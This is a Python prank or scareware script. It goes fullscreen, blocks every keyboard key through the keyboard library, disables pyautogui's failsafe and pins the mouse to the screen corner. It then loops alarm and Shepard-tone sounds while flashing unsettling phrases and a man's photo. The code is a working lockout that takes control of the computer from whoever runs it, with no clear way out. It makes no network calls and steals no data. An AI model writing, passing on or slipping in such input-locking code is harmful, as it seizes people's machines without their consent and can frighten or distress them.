import pygame
import random
import keyboard
import pyautogui
import os
import time

pygame.init()

main_dir = os.path.dirname(__file__)

#load files
warning = pygame.mixer.Sound("assets/sounds/warning.wav")
denied = pygame.mixer.Sound("assets/sounds/denied.wav")
shepard = pygame.mixer.Sound("assets/sounds/Shepard-tone.wav")
seagull = pygame.mixer.Sound("assets/sounds/seagull.wav")
paul = pygame.image.load("assets/img/paul.jpg")


#blocks all keys of keyboard
for i in range(150):
    keyboard.block_key(i)

phrases = ['My sins will forever be in debt', 'I can no longer pay for my sins', 'My bed has been made', 'HAVE YOU SEEN THIS MAN??', 'I wish I could regain control', 'WHO AM I',
           'who am I', 'Can you tell me who I am?', 'Why was I made to act this way', 'There are no more tears']

infoObject = pygame.display.Info()
screen = pygame.display.set_mode((infoObject.current_w, infoObject.current_h))
font = pygame.font.SysFont("Chiller", 70)

win_size = (infoObject.current_w, infoObject.current_h)
interval = 1  # seconds

start_time = time.time()
clock = pygame.time.Clock()

running = True
sound = True
while running:
    if sound == True:
        warning.play(loops=-1)
        denied.play(loops=-1)
        shepard.play(loops=-1)
        shepard.set_volume(.5)
        seagull.play(loops=-1)
        sound = False
    
    elapsed_time = time.time() - start_time

    # Check if it's time to display a new text
    if elapsed_time >= interval:
        # Generate random text and position
        text = random.choice(phrases)
        pos = (random.randint(0, win_size[0]), random.randint(0, win_size[1]))

        # Render the text
        text_surface = font.render(text, True, (255, 0, 0), (0,0,0))

        # Blit the text onto the window
        screen.blit(text_surface, pos)

        # Reset the start time
        start_time = time.time()


    pyautogui.FAILSAFE=False
    pyautogui.moveTo(0,0)
    screen.blit(paul, (random.randrange(0, infoObject.current_w), random.randrange(infoObject.current_h)))
    pygame.display.update()
    for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.MOUSEBUTTONDOWN:
                pass
    clock.tick(10)
